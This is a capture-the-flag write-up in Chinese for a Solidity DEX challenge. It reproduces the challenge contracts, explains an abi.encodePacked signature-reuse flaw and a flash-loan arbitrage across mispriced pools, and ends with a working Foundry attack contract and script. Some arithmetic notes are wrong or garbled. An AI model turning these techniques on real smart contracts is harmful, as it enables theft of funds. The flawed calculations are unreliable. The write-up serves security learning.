# SSSwap

swap套利（正常金融逻辑），abi.encodepacked和abi.encode区别

## 可能的方法

1. swap()里 amountin和amountin1
2. 通过三种币的这种关系和不同池子 套利
3. 闪电贷?没有手续费,借多少还多少,可以一试

## 问题

1. \~~怎么知道setup里三种币的初始balance~~
2. \~~swapAllowed变成ture那个条件怎么写~~
3. \~~setup里那个addloan有啥用~~
4. \~~怎么通过三种币的这种关系来套利~~
5. \~~怎么利用swap里这个amountin和amountin1的漏洞,除了可以一次多换点还有别的用处吗?~~

***

# 源码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

import {SimpleDEX} from "./DEX.sol";
import {IToken} from "./IToken.sol";

//rpc 154.92.16.51:20001
contract Setup {
    SimpleDEX public dex;
    address public profitReceiver = 0x0000000000000000000000000000000000114514;
    IToken public USDT;
    IToken public DLNU;
    IToken public RWEB;

    constructor(string memory data) {
        dex = new SimpleDEX(bytes(data));//实例

        USDT = new IToken("Tether USD", "USDT", address(this));
        DLNU = new IToken("VN Coin", "DLNU", address(this));
        RWEB = new IToken("WM Coin", "RWEB", address(this));

        //approve
        USDT.approve(address(dex), type(uint256).max);
        DLNU.approve(address(dex), type(uint256).max);
        RWEB.approve(address(dex), type(uint256).max);

        //create pool, addliquidity
        dex.createLiquidityPool(address(USDT), address(DLNU));//0 USDT-DLNU
        dex.addLiquidity(0, 10000 ether, 100_000 ether);//1:10

        dex.createLiquidityPool(address(DLNU), address(RWEB));//1 DLNU-RWEB
        dex.addLiquidity(1, 100_000 ether, 100_000 ether);//1:1

        dex.createLiquidityPool(address(USDT), address(RWEB));//2 USDT-RWEB
        dex.addLiquidity(2, 10_000 ether, 10_000 ether);//1:1



        //USDT 
        uint256 restUSDT = USDT.balanceOf(address(this));//
        USDT.approve(address(dex), restUSDT);
        dex.addLoan(restUSDT, address(USDT));//transferfrom(msg.sender,address(this),amount)

        //DLNU
        uint256 restDLNU = DLNU.balanceOf(address(this));//balance
        DLNU.approve(address(dex), restDLNU);
        dex.addLoan(restDLNU, address(DLNU));//transferfrom(msg.sender,address(this),amount)

        //RWEB
        uint256 restRWEB = RWEB.balanceOf(address(this));//balance
        RWEB.approve(address(dex), restRWEB);
        dex.addLoan(restRWEB, address(RWEB));//transferfrom(msg.sender,address(this),amount)
    }

    function isSolved() external view returns (bool) {
        return USDT.balanceOf(profitReceiver) >= 1000 ether;//swap 1000 ether 以上的USDT转给0x0000000000000000000000000000000000114514
    }
}


```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

import "./lib/ReentrancyGuard.sol";
import "./IToken.sol";

contract SimpleDEX is ReentrancyGuard {
    struct AMM {
        IToken token0;
        IToken token1;
        uint256 reserve0;
        uint256 reserve1;
        mapping(address => uint256) lpBalances0;
        mapping(address => uint256) lpBalances1;
    }
    bytes public signature;//0x52574542
    bool public swapAllowed;//1
    AMM[] public amms;
    mapping(bytes32 => bool) public usedHash;

    event FlashLoan(address indexed borrower, uint256 amount);

    modifier validSignature(bytes memory data1, bytes memory data2) {
        bytes32 hash = keccak256(abi.encode(data1, data2));//根据data1和data2现生成hash
        require(
            keccak256(signature) == keccak256(abi.encodePacked(data1, data2)),//encodePacked，拼接
            "Invalid signature"
        );
        require(!usedHash[hash], "Already used");//假限制
        usedHash[hash] = true;
        _;
    }

    constructor(bytes memory data) {
        signature = data;
        swapAllowed = false;
    }
    function checkSignature(bytes memory input) public {
        if (keccak256(input) == keccak256(signature)) {//pulic可读
            swapAllowed = true;
        } else {
            swapAllowed = false;
        }
    }

    function addAMM(address _token0, address _token1) external {
        require(_token0 != _token1, "Tokens must be different");

        amms.push();
        uint256 index = amms.length - 1;
        AMM storage amm = amms[index];

        amm.token0 = IToken(_token0);
        amm.token1 = IToken(_token1);
        amm.reserve0 = 0;
        amm.reserve1 = 0;
    }

    function createLiquidityPool(address _token0, address _token1) external {
        require(_token0 != _token1, "Tokens must be different");

        amms.push();
        uint256 index = amms.length - 1;
        AMM storage amm = amms[index];

        amm.token0 = IToken(_token0);
        amm.token1 = IToken(_token1);
        amm.reserve0 = 0;
        amm.reserve1 = 0;
    }

    function addLiquidity(
        uint256 ammIndex,
        uint256 amount0,
        uint256 amount1
    ) external {
        AMM storage amm = amms[ammIndex];
        require(
            amm.token0.transferFrom(msg.sender, address(this), amount0),
            "Transfer of token0 failed"
        );
        require(
            amm.token1.transferFrom(msg.sender, address(this), amount1),
            "Transfer of token1 failed"
        );

        amm.reserve0 += amount0;//reserve0 更新
        amm.reserve1 += amount1;//reserve1 更新
        amm.lpBalances0[msg.sender] += amount0;
        amm.lpBalances1[msg.sender] += amount1;
    }

    function removeLiquidity(uint256 ammIndex, uint256 lpAmount) external {
        AMM storage amm = amms[ammIndex];
        uint256 amount0 = (lpAmount * amm.lpBalances0[msg.sender]) / 100;
        uint256 amount1 = (lpAmount * amm.lpBalances1[msg.sender]) / 100;
        require(
            amm.token0.transfer(msg.sender, amount0),
            "Transfer of token0 failed"
        );
        require(
            amm.token1.transfer(msg.sender, amount1),
            "Transfer of token1 failed"
        );

        amm.reserve0 -= amount0;
        amm.reserve1 -= amount1;
        amm.lpBalances0[msg.sender] -= amount0;
        amm.lpBalances1[msg.sender] -= amount1;
    }

    function getPrice(uint256 ammIndex) external view returns (uint256) {
        AMM storage amm = amms[ammIndex];

        require(amm.reserve1 > 0, "Insufficient liquidity");
        return amm.reserve0 / amm.reserve1;
    }

    //核心swap
    function swap(
        uint256 ammIndex,//池子
        uint256 amountIn,
        uint256 amountIn1,//?
        bool isToken0,
        bytes memory data1,
        bytes memory data2
    ) external validSignature(data1, data2) {//核心swap
        AMM storage amm = amms[ammIndex];

        uint256 reserveIn = isToken0 ? amm.reserve0 : amm.reserve1;//想用谁换谁,顺序不变就true
        uint256 reserveOut = isToken0 ? amm.reserve1 : amm.reserve0;//顺序变就flase
        require(swapAllowed, "Swap not allowed");//checkSignature()
        require(
            amountIn1 == getExpectMaxSwapWithPriceImpact(ammIndex, isToken0),//检查amountIn1
            "The amount is not the maximum expected amount."
        );
        uint256 amountOut = getAmountOut(amountIn, reserveIn, reserveOut);//实际用amountIn

        if (isToken0) {
            require(
                amm.token0.transferFrom(msg.sender, address(this), amountIn),
                "Transfer of token0 failed"
            );
            require(
                amm.token1.transfer(msg.sender, amountOut),
                "Transfer of token1 failed"
            );
            amm.reserve0 += amountIn;
            amm.reserve1 -= amountOut;
        } else {
            require(
                amm.token1.transferFrom(msg.sender, address(this), amountIn),
                "Transfer of token1 failed"
            );
            require(
                amm.token0.transfer(msg.sender, amountOut),
                "Transfer of token0 failed"
            );
            amm.reserve1 += amountIn;
            amm.reserve0 -= amountOut;
        }
    }

    function addLoan(uint256 amount, address token) external {
        require(
            IToken(token).transferFrom(msg.sender, address(this), amount),
            "Transfer of tokens failed"
        );
    }

    //闪电贷
    function flashLoan(uint256 amount, address token) external nonReentrant {
        emit FlashLoan(msg.sender, amount);
        require(
            IToken(token).balanceOf(address(this)) >= amount,
            "Not enough tokens in pool"
        );

        IToken(token).transfer(msg.sender, amount);
        (bool success, ) = msg.sender.call(
            abi.encodeWithSignature(
                "executeOperation(uint256,address)",
                amount,
                token
            )
        );
        require(success, "Callback failed");

        require(
            IToken(token).transferFrom(msg.sender, address(this), amount),
            "Transfer of tokens failed"
        );

        emit FlashLoan(msg.sender, amount);
    }

    function getAmountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) internal pure returns (uint256) {
        require(amountIn > 0, "Insufficient input amount");
        require(reserveIn > 0 && reserveOut > 0, "Insufficient liquidity");
        uint256 amountInWithFee = amountIn * 1000;
        uint256 numerator = amountInWithFee * reserveOut;
        uint256 denominator = reserveIn * 1000 + amountInWithFee;
        return numerator / denominator;
    }

    function getExpectMaxSwapWithPriceImpact(
        uint256 ammIndex,
        bool isToken0
    ) private view returns (uint256 maxAmountIn) {
        AMM storage amm = amms[ammIndex];

        uint256 reserveIn = isToken0 ? amm.reserve0 : amm.reserve1;
        uint256 reserveOut = isToken0 ? amm.reserve1 : amm.reserve0;

        require(reserveIn > 0 && reserveOut > 0, "No liquidity");

        uint256 multiplier = 1026;
        uint256 newReserveInMax = (reserveIn * multiplier) / 1000;//就是reserveIn/1.026 

        if (newReserveInMax <= reserveIn) return 0;

        maxAmountIn = newReserveInMax - reserveIn;//reserveIn*0.026
    }
}

```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

import "./lib/ERC20.sol";

contract IToken is ERC20 {
    constructor(
        string memory name,
        string memory symbol,
        address owner
    ) ERC20(name, symbol) {
        _mint(owner, 1e30);
    }
}
```

```solidity

//contracts/lib/ERC20.sol
// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v5.2.0) (token/ERC20/ERC20.sol)

pragma solidity 0.8.9;

/**
 * @dev Interface of the ERC-20 standard as defined in the ERC.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    /**
     * @dev Returns the value of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the value of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves a `value` amount of tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 value) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    /**
     * @dev Sets a `value` amount of tokens as the allowance of `spender` over the
     * caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 value) external returns (bool);

    /**
     * @dev Moves a `value` amount of tokens from `from` to `to` using the
     * allowance mechanism. `value` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);
}

/**
 * @dev Interface for the optional metadata functions from the ERC-20 standard.
 */
contract ERC20 {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    uint256 public totalSupply;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function _mint(address _to, uint256 _amount) internal {
        totalSupply += _amount;
        balanceOf[_to] += _amount;
        emit Transfer(address(0), _to, _amount);
    }

    function transfer(address _to, uint256 _amount) external returns (bool) {
        require(
            balanceOf[msg.sender] >= _amount,
            "ERC20: insufficient balance"
        );
        balanceOf[msg.sender] -= _amount;
        balanceOf[_to] += _amount;
        emit Transfer(msg.sender, _to, _amount);
        return true;
    }

    function approve(
        address _spender,
        uint256 _amount
    ) external returns (bool) {
        allowance[msg.sender][_spender] = _amount;
        emit Approval(msg.sender, _spender, _amount);
        return true;
    }

    function transferFrom(
        address _from,
        address _to,
        uint256 _amount
    ) external returns (bool) {
        require(balanceOf[_from] >= _amount, "ERC20: insufficient balance");
        require(
            allowance[_from][msg.sender] >= _amount,
            "ERC20: allowance exceeded"
        );

        balanceOf[_from] -= _amount;
        balanceOf[_to] += _amount;
        allowance[_from][msg.sender] -= _amount;

        emit Transfer(_from, _to, _amount);
        return true;
    }
}
```

```solidity

//contracts/lib/ReentrancyGuard.sol
// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v5.1.0) (utils/ReentrancyGuard.sol)
pragma solidity 0.8.9;

/**
 * @dev Contract module that helps prevent reentrant calls to a function.
 *
 * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier
 * available, which can be applied to functions to make sure there are no nested
 * (reentrant) calls to them.
 *
 * Note that because there is a single `nonReentrant` guard, functions marked as
 * `nonReentrant` may not call one another. This can be worked around by making
 * those functions `private`, and then adding `external` `nonReentrant` entry
 * points to them.
 *
 * TIP: If EIP-1153 (transient storage) is available on the chain you're deploying at,
 * consider using {ReentrancyGuardTransient} instead.
 *
 * TIP: If you would like to learn more about reentrancy and alternative ways
 * to protect against it, check out our blog post
 * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].
 */
abstract contract ReentrancyGuard {
    // Booleans are more expensive than uint256 or any type that takes up a full
    // word because each write operation emits an extra SLOAD to first read the
    // slot's contents, replace the bits taken up by the boolean, and then write
    // back. This is the compiler's defense against contract upgrades and
    // pointer aliasing, and it cannot be disabled.

    // The values being non-zero value makes deployment a bit more expensive,
    // but in exchange the refund on every call to nonReentrant will be lower in
    // amount. Since refunds are capped to a percentage of the total
    // transaction's gas, it is best to keep them low in cases like this one, to
    // increase the likelihood of the full refund coming into effect.
    uint256 private constant NOT_ENTERED = 1;
    uint256 private constant ENTERED = 2;

    uint256 private _status;

    /**
     * @dev Unauthorized reentrant call.
     */
    error ReentrancyGuardReentrantCall();

    constructor() {
        _status = NOT_ENTERED;
    }

    /**
     * @dev Prevents a contract from calling itself, directly or indirectly.
     * Calling a `nonReentrant` function from another `nonReentrant`
     * function is not supported. It is possible to prevent this from happening
     * by making the `nonReentrant` function external, and making it call a
     * `private` function that does the actual work.
     */
    modifier nonReentrant() {
        _nonReentrantBefore();
        _;
        _nonReentrantAfter();
    }

    function _nonReentrantBefore() private {
        // On the first call to nonReentrant, _status will be NOT_ENTERED
        if (_status == ENTERED) {
            revert ReentrancyGuardReentrantCall();
        }

        // Any calls to nonReentrant after this point will fail
        _status = ENTERED;
    }

    function _nonReentrantAfter() private {
        // By storing the original value once again, a refund is triggered (see
        // https://eips.ethereum.org/EIPS/eip-2200)
        _status = NOT_ENTERED;
    }

    /**
     * @dev Returns true if the reentrancy guard is currently set to "entered", which indicates there is a
     * `nonReentrant` function in the call stack.
     */
    function _reentrancyGuardEntered() internal view returns (bool) {
        return _status == ENTERED;
    }
}
```

# 思路

首先看`issolved()`

```solidity
USDT.balanceOf(profitReceiver) >= 1000 ether;
//swap 1000 ether 以上的USDT转给0x0000000000000000000000000000000000114514
```

然后看setup初始都干了些什么

1. 创建USDT,DLNU,RWEB三种token,并approve授权给dex合约
2. create两两token之间的交易池,并添加初始流动性,这个时候我注意到比例的问题

<font style="color:#DF2A3F;">\[此处应该有我的ipad手稿图]</font>

显然我们可以通过这种倍率的bug来让我们投入的USDT翻倍

<font style="background-color:#FBDFEF;">USDT - DLNU - RWEB - USDT</font>，这就是我的整体通关思路

```solidity
  //create pool, addliquidity
        dex.createLiquidityPool(address(USDT), address(DLNU));//0 USDT-DLNU
        dex.addLiquidity(0, 10000 ether, 100_000 ether);//1:10

        dex.createLiquidityPool(address(DLNU), address(RWEB));//1 DLNU-RWEB
        dex.addLiquidity(1, 100_000 ether, 100_000 ether);//1:1

        dex.createLiquidityPool(address(USDT), address(RWEB));//2 USDT-RWEB
        dex.addLiquidity(2, 10_000 ether, 10_000 ether);//1:1
```

但是我们初始又是没有任何token的，继续看dex合约，发现可以<font style="background-color:#FBDFEF;">闪电贷</font>`flashLoan()`，并且dex池子里初始已经注入了充足的token供我们去贷

```solidity
       //USDT 
        uint256 restUSDT = USDT.balanceOf(address(this));//balance
        USDT.approve(address(dex), restUSDT);
        dex.addLoan(restUSDT, address(USDT));//transferfrom(msg.sender,address(this),amount)

        //DLNU
        uint256 restDLNU = DLNU.balanceOf(address(this));//balance
        DLNU.approve(address(dex), restDLNU);
        dex.addLoan(restDLNU, address(DLNU));//transferfrom(msg.sender,address(this),amount)

        //RWEB
        uint256 restRWEB = RWEB.balanceOf(address(this));//balance
        RWEB.approve(address(dex), restRWEB);
        dex.addLoan(restRWEB, address(RWEB));//transferfrom(msg.sender,address(this),amount)
    }
```

```solidity
//闪电贷
    function flashLoan(uint256 amount, address token) external nonReentrant {
        emit FlashLoan(msg.sender, amount);
        require(
            IToken(token).balanceOf(address(this)) >= amount,
            "Not enough tokens in pool"
        );//检查池子里token充足不

        IToken(token).transfer(msg.sender, amount);
        (bool success, ) = msg.sender.call(
            abi.encodeWithSignature(
                "executeOperation(uint256,address)",
                amount,
                token
            )
        );
        require(success, "Callback failed");

        require(
            IToken(token).transferFrom(msg.sender, address(this), amount),//借多少还多少，没有利息
            "Transfer of tokens failed"
        );

        emit FlashLoan(msg.sender, amount);
    }
```

这个闪电贷没有利息,借多少还多少,这个就解决了我们没有资金的问题,借一点,赚了还完之后剩下够1000 ether的USDT就可以了,那接下来我要开始构思swap环节了

```solidity
//核心swap
    function swap(
        uint256 ammIndex,//池子
        uint256 amountIn,
        uint256 amountIn1,//?
        bool isToken0,
        bytes memory data1,
        bytes memory data2
    ) external validSignature(data1, data2) {
        AMM storage amm = amms[ammIndex];

        uint256 reserveIn = isToken0 ? amm.reserve0 : amm.reserve1;//想用谁换谁,顺序不变就true
        uint256 reserveOut = isToken0 ? amm.reserve1 : amm.reserve0;//顺序变就flase
        require(swapAllowed, "Swap not allowed");//checkSignature()即可解决
        require(
            amountIn1 == getExpectMaxSwapWithPriceImpact(ammIndex, isToken0),//检查amountIn1
            "The amount is not the maximum expected amount."
        );
        uint256 amountOut = getAmountOut(amountIn, reserveIn, reserveOut);//实际用amountIn

        if (isToken0) {
            require(
                amm.token0.transferFrom(msg.sender, address(this), amountIn),
                "Transfer of token0 failed"
            );
            require(
                amm.token1.transfer(msg.sender, amountOut),
                "Transfer of token1 failed"
            );
            amm.reserve0 += amountIn;
            amm.reserve1 -= amountOut;
        } else {
            require(
                amm.token1.transferFrom(msg.sender, address(this), amountIn),
                "Transfer of token1 failed"
            );
            require(
                amm.token0.transfer(msg.sender, amountOut),
                "Transfer of token0 failed"
            );
            amm.reserve1 += amountIn;
            amm.reserve0 -= amountOut;
        }
    }
```

逻辑还是比较简单,我都标注在注释里了,但是标识符`validSignature`是个问题

```solidity
 modifier validSignature(bytes memory data1, bytes memory data2) {
        bytes32 hash = keccak256(abi.encode(data1, data2));//根据data1和data2现生成hash
        require(
            keccak256(signature) == keccak256(abi.encodePacked(data1, data2)),//encodePacked，拼接
            "Invalid signature"
        );
        require(!usedHash[hash], "Already used");//假限制
        usedHash[hash] = true;
        _;
    }
```

乍一看好像是只能用一次的限制,实际上再观察,会发现每次检查的hash是根据我们输入的data1和data2现生成的,并且检查方式还是`abi.encodePacked`拼接的,那我们只需读出signature的值,我们要swap三次,就构造三个不同组合,拼接出来都是signature就可以了

通过读槽,得到signature的值是`0x52574542`,即**RWEB**

我选择这样构造三个:

1. dex.signature(),""
2. "",dex.signature()
3. "RW","EB"

这样就可以供我们swap三次了

解决了这个标识符,还有`swap()`的参数问题,好解决的我都标注出来了

```solidity
uint256 reserveIn = isToken0 ? amm.reserve0 : amm.reserve1;//想用谁换谁,顺序不变就true
      uint256 reserveOut = isToken0 ? amm.reserve1 : amm.reserve0;//顺序变就flase
      require(swapAllowed, "Swap not allowed");//checkSignature()即可解决
      require(
          amountIn1 == getExpectMaxSwapWithPriceImpact(ammIndex, isToken0),//检查amountIn1
          "The amount is not the maximum expected amount."
      );
      uint256 amountOut = getAmountOut(amountIn, reserveIn, reserveOut);//实际用amountIn
```

重点是这个require检查这里,`getExpectMaxSwapWithPriceImpact(ammIndex, isToken0)`函数

```solidity
 function getExpectMaxSwapWithPriceImpact(
        uint256 ammIndex,
        bool isToken0
    ) private view returns (uint256 maxAmountIn) {
        AMM storage amm = amms[ammIndex];

        uint256 reserveIn = isToken0 ? amm.reserve0 : amm.reserve1;
        uint256 reserveOut = isToken0 ? amm.reserve1 : amm.reserve0;

        require(reserveIn > 0 && reserveOut > 0, "No liquidity");

        uint256 multiplier = 1026;
        uint256 newReserveInMax = (reserveIn * multiplier) / 1000;//就是reserveIn/1.026 

        if (newReserveInMax <= reserveIn) return 0;

        maxAmountIn = newReserveInMax - reserveIn;//reserveIn*0.026
    }
```

可以看到,他最后要一个池子的`maxAmountIn`,计算方式就是这个池子的<font style="background-color:#FBDFEF;">reserveIn\*0.026</font>

那就可以追溯到初始每个池子创建时投入的token数量,去分别\*0.026

* pool0: 10000\*0.0026=260 ether
* pool1: 1000000.0026=2600 ether
* pool2: 10000\*0.0026=260 ether

作为amountin1填入对应的swap()里就可以了,而我们实际swap的数量又是另一个参数amountin,为了稳妥一点,我选择是比这个`maxAmountIn`稍微少几ether,无伤大雅只要最后能剩1000 ether以上USDT就可以

最后别忘记给那个114514目标地址转USDT

abi.encode

# poc

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.9;

import {SimpleDEX} from "./DEX.sol";
import {IToken} from "./IToken.sol";
import {Setup} from "./setup.sol";
import "./lib/ERC20.sol";
import "./lib/ReentrancyGuard.sol";


contract Attack{
    SimpleDEX dex;
    Setup setup;

    constructor(address addr){
        setup=Setup(addr);
        dex=SimpleDEX(setup.dex());
    } 

    function go() external{
        dex.checkSignature(dex.signature());
        setup.USDT().approve(address(dex), type(uint256).max);
        setup.DLNU().approve(address(dex), type(uint256).max);
        setup.RWEB().approve(address(dex), type(uint256).max);
        dex.flashLoan(260 ether,address(setup.USDT()));
        setup.USDT().transfer(0x0000000000000000000000000000000000114514,1000 ether);
        require(setup.USDT().balanceOf(0x0000000000000000000000000000000000114514) >= 1000 ether,"not enough balance");
        require(setup.isSolved(),"no!!!!");
    }

    function executeOperation(uint256,address) public {
        // bytes memory a=abi.encodePacked(abi.encode(0x5257));
        // bytes memory b=abi.encodePacked(abi.encode(0x4542));

        dex.swap(0,260 ether ,260 ether,true,dex.signature(),"");
        dex.swap(1,2500 ether ,2600 ether,true,"",dex.signature());
        dex.swap(2,2400 ether ,260 ether,false,"RW","EB");
    }
     
}

```

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.9;

import {Attack} from "../src/1.sol";
import {Setup} from "../src/setup.sol";
import {Script} from "forge-std/Script.sol";

contract Attacksc is Script{
    Attack attack;
    //Setup setup;

    function run() external{
        
        vm.startBroadcast();
        attack=new Attack(0x48516466D5e5606F3CDf3F6927E1b5684A86d116);
        attack.go();
        vm.stopBroadcast();
    }
}

```


> 更新: 2026-03-05 20:15:39  
> 原文: <https://www.yuque.com/xiaoyuhushenfu/yzin4n/ce89cw8203sgigvg>